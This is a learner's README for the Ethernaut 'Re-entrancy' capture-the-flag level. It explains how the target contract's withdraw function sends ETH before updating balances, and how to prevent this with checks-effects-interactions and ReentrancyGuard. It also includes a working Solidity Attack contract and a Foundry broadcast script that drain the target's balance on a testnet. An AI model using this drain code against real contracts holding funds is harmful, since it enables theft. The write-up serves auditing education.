# Ethernaut Level: Re-entrancy - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Re-entrancy** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/reentrancy/`) contains everything related to it.

**Goal:** Drain the contract's balance to zero by exploiting the withdrawal function.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 24, 2025 (Day 11).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This contract allows donations and withdrawals with SafeMath for arithmetic safety, but the `withdraw` function performs an external call before updating the balance, enabling re-entrancy attacks.

**Key Code Snippet (from src/Re-entrancy/Reentrancy.sol):**
```solidity
contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");  // Vulnerable: External call before update!
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;  // Update after call
        }
    }

    receive() external payable {}
}
```

## Vulnerability Analysis
**Main Issue: Re-entrancy in Withdraw (External Call Before State Update)**  
- The `withdraw` function sends ETH via `msg.sender.call{value: _amount}` before subtracting from `balances[msg.sender]`, violating the Checks-Effects-Interactions (CEI) pattern. A malicious contract can re-enter `withdraw` in its `receive()` during the call, repeating the withdrawal while the balance remains unchanged.  
- **Security Impact:** Infinite ETH drainage, leading to total fund loss. This is the classic DAO hack vulnerability.  
- **Audit Tip:** Always update state before external calls. Use Slither to detect (`slither . --detect reentrancy`).

**Example:** Donate 0.001 ETH, withdraw 0.001 ETH—call triggers receive(), which re-withdraws before balance update, looping until drained.

## Solution Steps
The attack: Deploy an "Attack" contract that donates ETH, then calls `withdraw` to trigger re-entrancy in `receive()`, draining the balance.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/ReentranceSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** Contract balance = 0, submit on Ethernaut site.

**Key Attack Code Snippet (from src/Re-entrancy/Attack.sol and script/ReentranceSolution.s.sol):**
```solidity
// Attack Contract (src/Re-entrancy/Attack.sol)
contract Attack {
    Reentrance public reentrancy;
    uint256 public attackAmount;

    constructor(Reentrance _reentrancy) public payable {
        reentrancy = _reentrancy;
        attackAmount = msg.value;
        reentrancy.donate{value: msg.value}(address(this));  // Initial donate
    }

    function attack() external {
        reentrancy.withdraw(attackAmount);  // Start re-entrancy loop
    }

    receive() external payable {
        if (address(reentrancy).balance > 0) {
            reentrancy.withdraw(attackAmount);  // Re-enter and drain
        }
    }
}

// Script (script/ReentranceSolution.s.sol)
contract ReentranceSolution is Script {
    Reentrance public reentrancyInstance = Reentrance(payable(<your_contract_address>)); 

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Initial Contract Balance:", address(reentrancyInstance).balance);

        // Attack 
        uint256 attackValue = 0.001 ether;  // Donate amount
        Attack attacker = new Attack{value: attackValue}(reentrancyInstance);
        attacker.attack();

        console.log("Final Contract Balance:", address(reentrancyInstance).balance);  // 0 or drained

        vm.stopBroadcast();
    }
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates donation, withdrawal loop, and drainage.
- **Testnet Output Example:** Console log: "Initial Contract Balance: 1000000000000000", "Final Contract Balance: 0".

## Key Learnings
- **Auditing Skill:** Scan for external calls before state updates; simulate re-entrancy with Foundry's prank.
- **EVM Concept:** `call{value}` forwards ETH and executes fallback/receive, allowing re-entry.
- **Prevention:** Follow CEI; use OpenZeppelin's ReentrancyGuard with `nonReentrant` modifier.
- **Next Step:** Add gas limit in script for long loops; test with varying donation amounts.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/reentrancy`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/ReentranceSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! Next level: Elevator. 🚀

---

**License:** MIT  
**Author:** [0xZHD] - Smart Contract Auditor Learner  
**X:** [Zahedul I Sadik](@0xZHD_X)  
**References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)